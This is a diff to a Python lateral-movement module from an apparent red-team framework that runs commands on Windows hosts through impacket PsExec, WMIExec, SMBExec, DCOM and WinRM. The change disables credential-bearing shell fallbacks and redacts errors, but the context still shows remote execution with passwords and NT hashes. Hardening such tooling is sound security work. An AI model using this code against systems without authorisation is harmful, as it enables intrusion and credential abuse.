@@ -9,13 +9,15 @@ CLI tool fallbacks.
 Usage::
 
     from core.killchain.ad.lateral import psexec, wmiexec
-    result = psexec("10.10.10.100", {"user": "admin", "password": "P@ss", "domain": "CORP"})
+    # Canonical wrappers reveal a credential reference only for this call.
+    result = psexec("10.10.10.100", provider_material)
 """
+
+from __future__ import annotations
 
 import logging
 import shutil
 import subprocess
-from typing import Optional
 
 # ── Logging ──────────────────────────────────────────────────────────────
 logger = logging.getLogger("octopus.killchain.ad.lateral")
@@ -42,53 +44,47 @@ DCOM_PORT = 135
 
 # Internal helpers
 
-def _normalize_creds(creds: Optional[dict[str, str]]) -> dict[str, str]:
-    """Return a dict with guaranteed keys: user, password, domain, nthash."""
+def _normalize_creds(creds: dict[str, str] | None) -> dict[str, str]:
+    """Complete the provider-local material mapping without copying secrets."""
+
     defaults: dict[str, str] = {"user": "", "password": "", "domain": "", "nthash": ""}
-    if creds:
-        defaults.update(creds)
-    return defaults
+    if creds is None:
+        return defaults
+    for key, value in defaults.items():
+        creds.setdefault(key, value)
+    return creds
 
 
-def _run_cli(cmd: str, timeout: int = CLI_TIMEOUT) -> str:
-    """Execute a shell command and return combined stdout+stderr."""
+def _run_cli(cmd: list[str] | tuple[str, ...], timeout: int = CLI_TIMEOUT) -> str:
+    """Execute an explicit argv vector without a shell."""
+    if isinstance(cmd, (str, bytes)) or not cmd:
+        return "[!] Unsafe CLI command rejected: an argv sequence is required"
     try:
         result = subprocess.run(
-            cmd, shell=True, capture_output=True, text=True, timeout=timeout,
+            list(cmd), shell=False, capture_output=True, text=True, timeout=timeout,
         )
         return (result.stdout + result.stderr).strip()
     except subprocess.TimeoutExpired:
-        logger.warning("CLI command timed out: %s", cmd[:80])
+        logger.warning("CLI command timed out: %s", cmd[0])
         return f"[!] Command timed out after {timeout}s"
     except FileNotFoundError:
         return "[!] Command not found"
     except Exception as exc:
-        logger.error("CLI command failed: %s", exc)
-        return f"[!] Command error: {exc}"
+        logger.error("CLI command failed (%s)", type(exc).__name__)
+        return f"[!] Command error: {type(exc).__name__}"
 
 
-def _impacket_auth_string(creds: dict[str, str]) -> str:
-    """Build ``DOMAIN/user:password`` string for impacket CLI tools."""
-    domain = creds["domain"]
-    user = creds["user"]
-    password = creds["password"]
-    if domain:
-        return f"{domain}/{user}:{password}"
-    return f"{user}:{password}"
+def _provider_failure(exc: Exception) -> str:
+    """Return a bounded failure label without serializing provider arguments."""
 
-
-def _impacket_hash_arg(creds: dict[str, str]) -> str:
-    """Return ``-hashes :NTHASH`` flag if nthash is available."""
-    if creds.get("nthash"):
-        return f"-hashes :{creds['nthash']}"
-    return ""
+    return type(exc).__name__
 
 
 # PsExec
 
 def psexec(
     target: str,
-    creds: Optional[dict[str, str]] = None,
+    creds: dict[str, str] | None = None,
     command: str = "whoami && hostname && ipconfig",
 ) -> str:
     """Execute a command via PsExec (impacket).
@@ -136,17 +132,14 @@ def psexec(
     except ImportError:
         logger.debug("impacket psexec not importable — trying CLI")
     except Exception as exc:
-        logger.warning("impacket PsExec failed: %s", exc)
-        output += f"[!] impacket error: {exc}\n"
+        failure = _provider_failure(exc)
+        logger.warning("impacket PsExec failed (%s)", failure)
+        output += f"[!] impacket error: {failure}\n"
 
     # ── Fall back to CLI ──────────────────────────────────────────
     cli_bin = shutil.which("psexec.py") or shutil.which("impacket-psexec")
     if cli_bin:
-        auth = _impacket_auth_string(creds)
-        hash_arg = _impacket_hash_arg(creds)
-        cmd = f'{cli_bin} "{auth}@{target}" {hash_arg} -codec utf-8 "{command}"'
-        cli_out = _run_cli(cmd, timeout=IMPACKET_TIMEOUT)
-        output += f"(via CLI)\n{cli_out[:5000]}\n"
+        output += "[!] Credential-bearing PsExec CLI fallback is disabled.\n"
     else:
         output += "[!] No impacket psexec available. Install impacket.\n"
 
@@ -157,7 +150,7 @@ def psexec(
 
 def wmiexec(
     target: str,
-    creds: Optional[dict[str, str]] = None,
+    creds: dict[str, str] | None = None,
     command: str = "whoami && hostname && ipconfig",
 ) -> str:
     """Execute a command via WMI (Windows Management Instrumentation).
@@ -205,17 +198,14 @@ def wmiexec(
     except ImportError:
         logger.debug("impacket wmiexec not importable — trying CLI")
     except Exception as exc:
-        logger.warning("impacket WMIExec failed: %s", exc)
-        output += f"[!] impacket error: {exc}\n"
+        failure = _provider_failure(exc)
+        logger.warning("impacket WMIExec failed (%s)", failure)
+        output += f"[!] impacket error: {failure}\n"
 
     # ── Fall back to CLI ──────────────────────────────────────────
     cli_bin = shutil.which("wmiexec.py") or shutil.which("impacket-wmiexec")
     if cli_bin:
-        auth = _impacket_auth_string(creds)
-        hash_arg = _impacket_hash_arg(creds)
-        cmd = f'{cli_bin} "{auth}@{target}" {hash_arg} -codec utf-8 "{command}"'
-        cli_out = _run_cli(cmd, timeout=IMPACKET_TIMEOUT)
-        output += f"(via CLI)\n{cli_out[:5000]}\n"
+        output += "[!] Credential-bearing WMIExec CLI fallback is disabled.\n"
     else:
         output += "[!] No impacket wmiexec available. Install impacket.\n"
 
@@ -226,7 +216,7 @@ def wmiexec(
 
 def smbexec(
     target: str,
-    creds: Optional[dict[str, str]] = None,
+    creds: dict[str, str] | None = None,
     command: str = "whoami && hostname && ipconfig",
 ) -> str:
     """Execute a command via SMBExec.
@@ -275,17 +265,14 @@ def smbexec(
     except ImportError:
         logger.debug("impacket smbexec not importable — trying CLI")
     except Exception as exc:
-        logger.warning("impacket SMBExec failed: %s", exc)
-        output += f"[!] impacket error: {exc}\n"
+        failure = _provider_failure(exc)
+        logger.warning("impacket SMBExec failed (%s)", failure)
+        output += f"[!] impacket error: {failure}\n"
 
     # ── Fall back to CLI ──────────────────────────────────────────
     cli_bin = shutil.which("smbexec.py") or shutil.which("impacket-smbexec")
     if cli_bin:
-        auth = _impacket_auth_string(creds)
-        hash_arg = _impacket_hash_arg(creds)
-        cmd = f'{cli_bin} "{auth}@{target}" {hash_arg} -codec utf-8 "{command}"'
-        cli_out = _run_cli(cmd, timeout=IMPACKET_TIMEOUT)
-        output += f"(via CLI)\n{cli_out[:5000]}\n"
+        output += "[!] Credential-bearing SMBExec CLI fallback is disabled.\n"
     else:
         output += "[!] No impacket smbexec available. Install impacket.\n"
 
@@ -296,7 +283,7 @@ def smbexec(
 
 def winrm_exec(
     target: str,
-    creds: Optional[dict[str, str]] = None,
+    creds: dict[str, str] | None = None,
     command: str = "whoami && hostname && ipconfig",
 ) -> str:
     """Execute a command via Windows Remote Management (WinRM).
@@ -353,7 +340,12 @@ def winrm_exec(
                 print(f"    {C_GREEN}[+] WinRM command executed!{C_RESET}")
                 return output
             except Exception as exc:
-                logger.debug("WinRM %s:%d failed: %s", scheme, port, exc)
+                logger.debug(
+                    "WinRM %s:%d failed (%s)",
+                    scheme,
+                    port,
+                    _provider_failure(exc),
+                )
                 continue
 
         output += "[!] WinRM connection failed on both HTTP and HTTPS.\n"
@@ -363,12 +355,7 @@ def winrm_exec(
     # ── Fall back to evil-winrm CLI ───────────────────────────────
     evil_bin = shutil.which("evil-winrm")
     if evil_bin:
-        cmd = (
-            f'{evil_bin} -i {target} -u "{creds["user"]}" '
-            f'-p "{creds["password"]}" -c "{command}"'
-        )
-        cli_out = _run_cli(cmd, timeout=IMPACKET_TIMEOUT)
-        output += f"(via evil-winrm CLI)\n{cli_out[:5000]}\n"
+        output += "[!] Credential-bearing evil-winrm CLI fallback is disabled.\n"
     else:
         output += "[!] No WinRM client available. Install pywinrm or evil-winrm.\n"
 
@@ -379,7 +366,7 @@ def winrm_exec(
 
 def dcom_exec(
     target: str,
-    creds: Optional[dict[str, str]] = None,
+    creds: dict[str, str] | None = None,
     command: str = "whoami && hostname && ipconfig",
 ) -> str:
     """Execute a command via DCOM (Distributed COM).
@@ -430,27 +417,25 @@ def dcom_exec(
                 print(f"    {C_GREEN}[+] DCOM command executed via {dcom_object}!{C_RESET}")
                 return output
             except Exception as exc:
-                logger.debug("DCOM %s failed: %s", dcom_object, exc)
+                logger.debug(
+                    "DCOM %s failed (%s)",
+                    dcom_object,
+                    _provider_failure(exc),
+                )
                 continue
 
         output += "[!] All DCOM objects failed.\n"
     except ImportError:
         logger.debug("impacket dcomexec not importable — trying CLI")
     except Exception as exc:
-        logger.warning("impacket DCOM exec failed: %s", exc)
-        output += f"[!] impacket error: {exc}\n"
+        failure = _provider_failure(exc)
+        logger.warning("impacket DCOM exec failed (%s)", failure)
+        output += f"[!] impacket error: {failure}\n"
 
     # ── Fall back to CLI ──────────────────────────────────────────
     cli_bin = shutil.which("dcomexec.py") or shutil.which("impacket-dcomexec")
     if cli_bin:
-        auth = _impacket_auth_string(creds)
-        hash_arg = _impacket_hash_arg(creds)
-        cmd = (
-            f'{cli_bin} "{auth}@{target}" {hash_arg} '
-            f'-codec utf-8 -object MMC20 "{command}"'
-        )
-        cli_out = _run_cli(cmd, timeout=IMPACKET_TIMEOUT)
-        output += f"(via CLI)\n{cli_out[:5000]}\n"
+        output += "[!] Credential-bearing DCOM CLI fallback is disabled.\n"
     else:
         output += "[!] No impacket dcomexec available. Install impacket.\n"
 
